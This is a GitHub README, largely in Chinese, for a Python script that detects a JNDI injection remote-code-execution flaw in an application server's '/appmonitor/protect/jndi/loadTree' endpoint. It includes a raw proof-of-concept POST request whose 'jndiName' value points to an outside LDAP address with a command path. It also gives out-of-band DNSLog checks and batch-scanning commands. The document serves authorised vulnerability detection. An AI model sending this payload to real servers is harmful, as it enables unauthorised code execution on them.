# Python_loadTree_JNDI_script
# JNDI 注入自动化检测脚本 (jndi_inject_detect)

<p align="left">
  <img src="https://img.shields.io/badge/Stage-Exploit-red.svg" alt="Stage">
  <img src="https://img.shields.io/badge/Language-Python%203-blue.svg" alt="Language">
  <img src="https://img.shields.io/badge/Vuln-JNDI%20Injection-orange.svg" alt="Vuln">
</p>

> 渗透项目 / 渗透工具 / 应急脚本

---

## 🔍 漏洞详情与原理

### 1. 漏洞概述
系统中的 `/appmonitor/protect/jndi/loadTree` 接口存在高危 JNDI 注入缺陷，可以通过传入恶意的 LDAP / RMI 地址实现远程代码执行或资源加载。

### 2. 漏洞证明 (POC)
漏洞通过 POST 请求触发，参数 `jndiName` 未经过过滤直接传入底层 JNDI Lookup 方法，可以通过 DNSLog 解析来确证漏洞存在：

http:

    POST /appmonitor/protect/jndi/loadTree HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    jndiName=ldap://{{interactsh-url}}/Basic/Command/calc
    Due to improper permission checks on the app server, attackers can trigger JNDI injection via the "loadTree" interface to achieve RCE (requires lower JDK versions). Legacy vuln, patched in August. EAS is also affected with a different path.

# 1. 克隆本项目仓库到本地
    
    git clone [https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git](https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git)
# 2. 切换进入到脚本所在的根目录下

    cd Python_loadTree_JNDI_script
# 3. 安装脚本运行所必须的依赖库
    
    pip install requests

# 🚀 脚本运行指南
## 💡 核心运行机制 (DNSLog 测试)：
    由于 JNDI 注入属于无回显漏洞，本脚本将利用 DNSLog 进行带外测试（OOB）。脚本会自动把目标主机的 Host 拼接在你的 DNSLog 域名前面（例如 192.168.1.1.your-dnslog.com）。你只需在发包结束后，去你的 DNSLog 控制台查看是否有该子域名的解析记录，即可 100% 确认该主机是否存在安全缺陷。

🔹 示例 1：检测单个目标 URL 并指定 DNSLog 接收端 (-u & -d)

    python3 jndi_inject_detect.py -u [http://example.com](http://example.com) -d abc.dnslog.cn
🔹 示例 2：批量读取文本进行扫描并指定 DNSLog 接收端 (-f & -d)

    python3 jndi_inject_detect.py -f targets.txt -d abc.dnslog.cn
🚫 免责声明
⚠️ （##免责声明：仅用于科学上网绿色实验健康学习##）

本脚本仅用于法律授权的甲方自查、合规的白帽渗透测试及网络安全教学实验。严禁用于任何未授权的非法攻击行为。任何因非合规使用导致的法律后果，均由使用者本人承担！




**应用服务器权限验证不当，导致攻击者可以向loadTree接口执行JNDI注入，造成远程代码执行漏洞。利用该漏洞需低版本JDK。（漏洞比较旧，8月份补丁已出，**EAS也存在类似漏洞，只是路径不一样）
